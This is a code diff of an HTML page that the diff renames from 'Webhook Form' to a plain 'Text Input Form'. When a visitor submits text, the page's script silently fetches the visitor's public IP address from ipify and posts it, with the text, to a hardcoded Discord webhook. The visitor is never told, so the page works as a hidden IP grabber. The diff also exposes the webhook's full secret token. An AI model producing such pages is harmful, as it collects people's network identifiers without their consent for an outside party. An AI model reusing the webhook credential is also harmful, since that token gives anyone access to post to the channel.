@@ -1,29 +1,47 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Webhook Form</title>
-  </head>
-  <body>
-    <form action="https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S" method="POST" id="form">
-      <label for="text">Enter your message:</label><br>
-      <input type="text" id="text" name="text"><br>
-      <input type="hidden" id="ip" name="ip" value="">
-      <input type="submit" value="Send" style="background-color: green;">
-    </form> 
+<head>
+  <title>Text Input Form</title>
+</head>
+<body>
+  <h1>Text Input Form</h1>
+  <form id="form" method="POST">
+    <label for="text">Enter some text:</label><br>
+    <input type="text" id="text" name="text"><br>
+    <input type="submit" value="Submit">
+  </form> 
+  <script>
+    // Get the form element
+    const form = document.getElementById('form');
 
-    <script>
-      function getIP(json) {
-        document.getElementById('ip').value = json.ip;
-      }
+    // Handle form submission
+    form.addEventListener('submit', (event) => {
+      event.preventDefault();
 
-      const xhr = new XMLHttpRequest();
-      xhr.onreadystatechange = function() {
-        if (this.readyState == 4 && this.status == 200) {
-          getIP(JSON.parse(this.responseText));
-        }
-      };
-      xhr.open("GET", "https://api.ipify.org?format=json", true);
-      xhr.send();
-    </script>
-  </body>
+      // Get the text input value
+      const text = document.getElementById('text').value;
+
+      // Get the user's IP address
+      fetch('https://api.ipify.org?format=json')
+        .then((response) => response.json())
+        .then((data) => {
+          const ip = data.ip;
+          console.log(`Text: ${text}`);
+          console.log(`IP address: ${ip}`);
+
+          // Send the IP address and text to the Discord webhook
+          fetch('https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              content: `Text: ${text}\nIP address: ${ip}`
+            })
+          });
+        });
+    });
+  </script>
+</body>
 </html>
+
